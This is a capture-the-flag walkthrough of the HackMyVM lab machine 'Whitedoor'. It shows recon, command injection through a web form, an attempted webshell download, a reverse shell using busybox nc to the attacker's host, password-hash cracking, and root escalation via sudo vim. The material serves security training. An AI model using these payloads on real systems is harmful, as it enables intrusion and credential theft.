# Whitedoor

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.130:21
Open 10.0.2.130:22
Open 10.0.2.130:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.130
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              13 Nov 16  2023 README.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 3d:85:a2:89:a9:c5:45:d0:1f:ed:3f:45:87:9d:71:a6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEnBshjXAQP4J7IJgUDeAGOVKp8s5w+j3ie21EfPD+ewdmWNLgLGabrELQA5uzJV6AKymnEOW2Td+Z2vqStFmSc=
|   256 07:e8:c5:28:5e:84:a7:b6:bb:d5:1d:2f:d8:92:6b:a6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHfAu7PFuuG2KpPj2lBjwkEf1XI07LwqaOI7eQyE4TBz
80/tcp open  http    syn-ack Apache httpd 2.4.57 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home
|_http-server-header: Apache/2.4.57 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## FTP

```bash
└─$ ftp anonymous@10.0.2.130
Password:
230 Login successful.
ftp> ls
ftp> get README.txt
ftp> put README.txt
550 Permission denied.
ftp> exit
221 Goodbye.

└─$ cat README.txt
¡Good luck!
```

## HTTP

Straight up backdoor, ay?

![writeup.png](/assets/pentest/hackmyvm/whitedoor/writeup.png)

![writeup-1.png](/assets/pentest/hackmyvm/whitedoor/writeup-1.png)

We can bypass with whitelisted command and then new command.
```bash
└─$ curl 'http://10.0.2.130/index.php' --data-urlencode 'entrada=ls ;id' -d 'submit=' -s | htmlq -t pre
ls ;id
blackdoor.webp
blackindex.php
index.php
whitedoor.jpg
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Try to upload proper webshell
```bash
└─$ curl 'http://10.0.2.130/index.php' --data-urlencode 'entrada=ls ;curl 10.0.2.15/shell.php -O' -d 'submit=' -s | htmlq -t pre
# No response
└─$ curl 'http://10.0.2.130/index.php' --data-urlencode 'entrada=ls ;wget 10.0.2.15/shell.php' -d 'submit=' -s | htmlq -t pre
# Response = (Probably) Uploaded
└─$ curl 'http://10.0.2.130/shell.php' -s | htmlq title
<title>404 Not Found</title>
```

Welp, looks like no permissions to add new files. 

Get a reverse shell
```bash
└─$ curl 'http://10.0.2.130/index.php' --data-urlencode 'entrada=ls ;busybox nc 10.0.2.15 4444 -e /bin/bash' -d 'submit=' -s | htmlq -t pre
---
www-data@whitedoor:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
www-data@whitedoor:/var/www/html$ find /home -type f -ls 2>/dev/null
   391702      4 -rw-r--r--   1 whiteshell whiteshell      807 Apr 23  2023 /home/whiteshell/.profile
   391703      4 -rw-r--r--   1 whiteshell whiteshell      220 Apr 23  2023 /home/whiteshell/.bash_logout
   391704      4 -rw-r--r--   1 whiteshell whiteshell     3526 Apr 23  2023 /home/whiteshell/.bashrc
   391707      4 -r--r--r--   1 whiteshell whiteshell       56 Nov 16  2023 /home/whiteshell/Desktop/.my_secret_password.txt
```

```bash
www-data@whitedoor:/$ cat /home/whiteshell/Desktop/.my_secret_password.txt
whiteshell:VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K

└─$ echo VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K | base64 -d | base64 -d
Th1sIsTh3P4sSwOrDblac5
```

## SSH (whiteshell)

::: info Creds
`whiteshell:Th1sIsTh3P4sSwOrDblac5`
:::

```bash
└─$ sshpass -p 'Th1sIsTh3P4sSwOrDblac5' ssh whiteshell@10.0.2.130
whiteshell@whitedoor:~$ id
uid=1001(whiteshell) gid=1001(whiteshell) groups=1001(whiteshell)
```

## Privilege Escalation (Gonzalo)

```bash
whiteshell@whitedoor:/home/Gonzalo$ find . -type f -ls 2>/dev/null
   391698      4 -rw-r--r--   1 Gonzalo  Gonzalo       807 Apr 23  2023 ./.profile
   391699      4 -rw-r--r--   1 Gonzalo  Gonzalo       220 Apr 23  2023 ./.bash_logout
   391700      4 -rw-r--r--   1 Gonzalo  Gonzalo      3526 Apr 23  2023 ./.bashrc
   391723      4 -rw-r-----   1 root     Gonzalo        20 Nov 16  2023 ./Desktop/user.txt
   391708      4 -r--r--r--   1 root     root           61 Nov 16  2023 ./Desktop/.my_secret_hash
   391706      4 -rw-------   1 Gonzalo  Gonzalo       718 Nov 17  2023 ./.bash_history

whiteshell@whitedoor:/home/Gonzalo$ cat ./Desktop/.my_secret_hash
$2y$10$CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj/Y48ZlAbQF6
```

```powershell
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
qwertyuiop       (Gonzalo)
```

::: info Creds
`Gonzalo:qwertyuiop`
:::

```bash
└─$ sshpass -p 'qwertyuiop' ssh Gonzalo@10.0.2.130
Gonzalo@whitedoor:~$ id
uid=1002(Gonzalo) gid=1002(Gonzalo) groups=1002(Gonzalo)
```

### User.txt

```bash
Gonzalo@whitedoor:~$ cat Desktop/user.txt
Y0uG3tTh3Us3RFl4g!!
```

## Privilege Escalation (root)

```bash
Gonzalo@whitedoor:~$ sudo -l
Matching Defaults entries for Gonzalo on whitedoor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User Gonzalo may run the following commands on whitedoor:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
```

- [https://gtfobins.github.io/gtfobins/vim/#sudo](https://gtfobins.github.io/gtfobins/vim/#sudo)

```bash
Gonzalo@whitedoor:~$ sudo vim -c ':!/bin/bash'
root@whitedoor:/home/Gonzalo# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@whitedoor:/home/Gonzalo# cat /root/root.txt
Y0uAr3Th3B3sTy0Ug3Tr0oT!!
```